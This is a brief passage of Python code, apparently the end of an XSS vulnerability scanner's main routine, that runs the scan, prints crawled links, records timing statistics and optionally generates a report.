    scan_xss(args.url, args) 
    print_crawled_links()
    
    # Report Generation
    end_time = time.time()
    SCAN_STATS["scan_end"] = datetime.datetime.now().isoformat()
    SCAN_STATS["duration_seconds"] = end_time - start_time
    
    if args.report:
        generate_report(SCAN_STATS, args.report)
